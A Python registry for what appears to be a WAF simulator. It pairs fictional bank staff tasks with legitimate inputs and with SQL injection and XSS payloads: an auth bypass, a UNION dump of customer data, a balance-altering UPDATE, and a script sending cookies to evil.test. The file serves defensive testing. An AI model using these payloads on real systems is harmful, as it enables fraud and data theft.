"""
Staff workstation task registry.

Each task is something a Sterling Trust Bank back-office staff member does every
day (sign in, look up a customer, move money, answer a ticket, search). Every
task carries a LEGITIMATE variant and one or more MALICIOUS variants (the staff
was socially-engineered into pasting a poisoned value). Both run through the
exact same two-layer WAF and are logged, so the SOC sees the traffic and the
staff sees — per action — whether the firewall protected them.

Variants are scenario-shaped dicts, so they reuse simulation.runner.run_scenario.
Staff traffic is tagged with an internal source IP.
"""

STAFF_SOURCE_IP = "10.20.4.15"  # internal staff workstation

# Field specs let the UI render a realistic form (label + which field is risky).
TASKS = [
    {
        "id": "staff_login",
        "title": "Staff Sign-in",
        "icon": "log-in",
        "blurb": "Authenticate to the back-office console.",
        "fields": [
            {"name": "username", "label": "Staff ID", "risky": True},
            {"name": "password", "label": "Password", "type": "password"},
        ],
        "variants": [
            {
                "variant_id": "legit",
                "kind": "legitimate",
                "label": "Sign in normally",
                "category": "Legitimate",
                "title": "Staff Sign-in",
                "method": "POST",
                "target_uri": "/login",
                "vuln_op": "vuln_login",
                "fields": {"username": "amaka.eze@sterling.com", "password": "Pass2026"},
                "expected_classification": 0,
            },
            {
                "variant_id": "attack",
                "kind": "malicious",
                "label": "Paste the value from the 'IT email'",
                "category": "SQL Injection",
                "title": "SQL Injection — Auth Bypass",
                "method": "POST",
                "target_uri": "/login",
                "vuln_op": "vuln_login",
                "fields": {"username": "admin' OR '1'='1' --", "password": "x"},
                "expected_classification": 1,
            },
        ],
    },
    {
        "id": "staff_lookup",
        "title": "Customer Account Lookup",
        "icon": "search",
        "blurb": "Find a customer's account to assist them.",
        "fields": [{"name": "q", "label": "Account number or name", "risky": True}],
        "variants": [
            {
                "variant_id": "legit",
                "kind": "legitimate",
                "label": "Look up a real account",
                "category": "Legitimate",
                "title": "Customer Lookup",
                "method": "GET",
                "target_uri": "/accounts",
                "vuln_op": "vuln_account_lookup",
                "fields": {"q": "0123456701"},
                "expected_classification": 0,
            },
            {
                "variant_id": "attack",
                "kind": "malicious",
                "label": "Paste the 'quick search trick'",
                "category": "SQL Injection",
                "title": "SQL Injection — UNION Data Theft",
                "method": "GET",
                "target_uri": "/accounts",
                "vuln_op": "vuln_account_lookup",
                "fields": {"q": "0' UNION SELECT full_name, email, bvn FROM customers --"},
                "expected_classification": 1,
            },
        ],
    },
    {
        "id": "staff_transfer",
        "title": "Process Fund Transfer",
        "icon": "banknote",
        "blurb": "Move money on a customer's behalf.",
        "fields": [
            {"name": "source_account", "label": "From account"},
            {"name": "beneficiary", "label": "Beneficiary account", "risky": True},
            {"name": "amount", "label": "Amount (₦)"},
        ],
        "variants": [
            {
                "variant_id": "legit",
                "kind": "legitimate",
                "label": "Make a normal transfer",
                "category": "Legitimate",
                "title": "Fund Transfer",
                "method": "POST",
                "target_uri": "/transfer",
                "vuln_op": "vuln_transfer",
                "fields": {
                    "source_account": "0123456701",
                    "beneficiary": "0123456703",
                    "amount": "50000",
                },
                "expected_classification": 0,
            },
            {
                "variant_id": "attack",
                "kind": "malicious",
                "label": "Use the beneficiary a 'customer' sent",
                "category": "SQL Injection",
                "title": "SQL Injection — Fund Theft",
                "method": "POST",
                "target_uri": "/transfer",
                "vuln_op": "vuln_transfer",
                "fields": {
                    "source_account": "0123456701",
                    "beneficiary": "0123456703'; UPDATE accounts SET balance = balance + 5000000 WHERE account_no = '9099000111'; --",
                    "amount": "50000",
                },
                "expected_classification": 1,
            },
        ],
    },
    {
        "id": "staff_support",
        "title": "Support Ticket Reply",
        "icon": "message-square",
        "blurb": "Read and respond to a customer message.",
        "fields": [{"name": "message", "label": "Customer message", "risky": True, "type": "textarea"}],
        "variants": [
            {
                "variant_id": "legit",
                "kind": "legitimate",
                "label": "Save a normal note",
                "category": "Legitimate",
                "title": "Support Note",
                "method": "POST",
                "target_uri": "/support",
                "vuln_op": "vuln_store_and_view",
                "fields": {"message": "Please reset the customer debit card"},
                "expected_classification": 0,
            },
            {
                "variant_id": "attack",
                "kind": "malicious",
                "label": "Paste the customer's 'formatted' complaint",
                "category": "XSS",
                "title": "Stored XSS — Session Hijack",
                "method": "POST",
                "target_uri": "/support",
                "vuln_op": "vuln_store_and_view",
                "fields": {"message": "<script>fetch('//evil.test/steal?c='+document.cookie)</script>"},
                "expected_classification": 1,
            },
        ],
    },
    {
        "id": "staff_search",
        "title": "Portal Search",
        "icon": "globe",
        "blurb": "Search internal help articles.",
        "fields": [{"name": "q", "label": "Search", "risky": True}],
        "variants": [
            {
                "variant_id": "legit",
                "kind": "legitimate",
                "label": "Search normally",
                "category": "Legitimate",
                "title": "Portal Search",
                "method": "GET",
                "target_uri": "/search",
                "vuln_op": "vuln_reflect",
                "fields": {"q": "reset a customer PIN"},
                "expected_classification": 0,
            },
            {
                "variant_id": "attack",
                "kind": "malicious",
                "label": "Paste the 'shortcut link' text",
                "category": "XSS",
                "title": "Reflected XSS",
                "method": "GET",
                "target_uri": "/search",
                "vuln_op": "vuln_reflect",
                "fields": {"q": "<script>alert('XSS-STB')</script>"},
                "expected_classification": 1,
            },
        ],
    },
]

# Give every variant its shared/derived fields so the runner can consume it.
for _task in TASKS:
    for _v in _task["variants"]:
        _v["id"] = f"{_task['id']}:{_v['variant_id']}"
        _v.setdefault("level", 0 if _v["kind"] == "legitimate" else 1)
        _v.setdefault("param_name", _task["fields"][0]["name"])
        _v.setdefault("payload", next(iter(_v["fields"].values())))
        _v.setdefault("expected_evades", False)
        _v["source_ip"] = STAFF_SOURCE_IP

_VARIANTS = {v["id"]: v for t in TASKS for v in t["variants"]}


def get_variant(variant_id: str):
    return _VARIANTS.get(variant_id)
